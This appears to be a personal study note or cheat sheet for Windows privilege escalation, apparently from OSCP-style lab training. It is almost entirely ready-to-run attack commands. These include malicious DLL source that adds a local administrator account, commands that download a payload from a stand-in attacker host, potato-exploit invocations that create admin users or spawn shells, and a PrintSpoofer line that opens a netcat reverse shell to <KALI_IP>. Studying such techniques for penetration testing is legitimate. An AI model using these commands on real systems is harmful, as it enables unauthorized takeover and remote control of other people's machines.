
| [[07 Windows Privilege Escalation#Service Binary Hijacking\|Service Binary Hijacking]] | [[07 Windows Privilege Escalation#DLL Hijacking\|DLL Hijacking]] | [[07 Windows Privilege Escalation#Unquoted Service Paths\|Unquoted System Paths]] | [[07 Windows Privilege Escalation#Scheduled Tasks\|Scheduled Tasks]] |
| ----------------------------------------------------------------------------------- | ------------------------------------------------------------- | ------------------------------------------------------------------------------ | ----------------------------------------------------------------- |
| [[07 Windows Privilege Escalation#Using Exploits\|Using Exploits]]                     |                                                               |                                                                                |                                                                   |
## Service Binary Hijacking
```powershell
# List all running services
PS C:\Users\offsec> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} 
# can also use Services.msc GUI if RDP'd in

# List permissions of service binaries
PS C:\Users\offsec> icacls "C:\xampp\mysql\bin\mysqld.exe"
# Can also use Get-ACL pwsh cmdlet
# If have perms to Full, Modify or Write, replace binary with malicious binary

# Check service startup type
PS C:\Users\offsec> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

# Check user privileges (to send reboot)
PS C:\Users\offsec> whoami /priv
# Look for SeShutdownPrivilege

# Restart system
PS C:\Users\offsec> shutdown /r /t 0

# Use PowerUp.ps1 tool, upload from Kali
PS C:\Users\offsec> powershell -ep bypass
PS C:\Users\offsec> . .\PowerUp.ps1
PS C:\Users\offsec> Get-ModifiableServiceFile
```
## DLL Hijacking
```shell
# Look for installed applications via enumeration
PS C:\Users\offsec> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# Take note of insecure pathnames, e.g. outside sys32

# Check for write permissions inside the application directory
icacls "C:\xampp\mysql\bin" 

# OR Copy service directory to local machine and use procmon to identify DLLs loaded/missing
Filter via Process (service process) + CreateFile Operation

# Create malicious DLL
kali@kali:~$ cat TextShaping.cpp
"""
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(

HANDLE hModule, // Handle to DLL module

DWORD ul_reason_for_call, // Reason for calling function

LPVOID lpReserved ) // Reserved
{
   switch ( ul_reason_for_call)
   {
      case DLL_PROCESS_ATTACH: // A process is loading the DLL.
      int i;
      i = system (“net user dave3 password123! /add”);
      i = system (“net localgroup administrators dave3 /add”);
      break;
      case DLL_THREAD_ATTACH: // A process is creating a new thread.
      break;
      case DLL_THREAD_DETACH: // A thread exits normally.
      break;
      case DLL_PROCESS_DETACH: // A process unloads the DLL.
      break;
   }
   return TRUE;
}
"""

# Compile malicious DLL as DLL
kali@kali:~$ x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
# Rename to target DLL to replace

# Wait for higher priv user to run the application and trigger the loading of the malicious DLL
```
## Unquoted Service Paths
```powershell
# Enumerate running and stopped services
PS C:\Users\offsec> Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# Secondary method on CMD
C:\Users\offsec> wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check start/stop permissions on that service (autorun or not)
PS C:\Users\offsec> Start-Service GammaService
PS C:\Users\offsec> Stop-Service GammaService

# Check for modify/write permissions in the attempted run paths
PS C:\Users\offsec> icacls "C:\"
PS C:\Users\offsec> icacls "C:\Program Files"
PS C:\Users\offsec> icacls "C:\Program Files\Enterprise Apps"

# Copy malicious service binary into the writable run path and restart service

# PowerUp.ps1 function
PS C:\Users\offsec> Get-UnquotedService
PS C:\Users\offsec> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe" # Take note of command ran
PS C:\Users\offsec> Restart-Service GammaService
PS C:\Users\offsec> net user
```

## Scheduled Tasks
```powershell
# View scheduled tasks
PS C:\Users\offsec> schtasks /query /fo LIST /v

# Check permissions with icacls on the files scheduled to run
PS C:\Users\offsec> icacls "C:\Users\steve\Pictures\BackendCacheCleanup.exe"

# Copy malicious executable to replace scheduled executable
PS C:\Users\offsec> iwr -Uri http://<KALI_IP>/adduser.exe -Outfile BackendCacheCleanup.exe
```

## Using Exploits
```powershell
# Find exploits based on Windows OS & Security Updates
PS C:\Users\offsec> systeminfo # OS Version
PS C:\Users\offsec> Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update"} # get list of installed security updates

# e.g CVE-2023-29360

# Using XXXPotato, requires SeImpersonatePrivilege, download from github
# Can also rely on SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, SeDebug
PS C:\Users\offsec> whoami /priv # view privileges
PS C:\Users\offsec> .\SigmaPotato "net user dave4 lab /add"
PS C:\Users\offsec> .\SigmaPotato "net localgroup Administrators dave4 /add"
PS C:\Users\offsec> RoguePotato.exe -r <KALI_IP> -e "shell.exe" -l 9999
PS C:\Users\offsec> GodPotato.exe -cmd "cmd /c whoami"
PS C:\Users\offsec> GodPotato.exe -cmd "shell.exe"
PS C:\Users\offsec> JuicyPotatoNG.exe -t * -p "shell.exe" -a
PS C:\Users\offsec> SharpEfsPotato -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log" # writes output to w.log file
# Use newest/different .NET version of GodPotato if needed


# PrintSpoofer
PS C:\Users\offsec> PrintSpoofer.exe -i -c powershell.exe
PS C:\Users\offsec> PrintSpoofer.exe -c "nc.exe <KALI_IP> <PORT> -e cmd"
```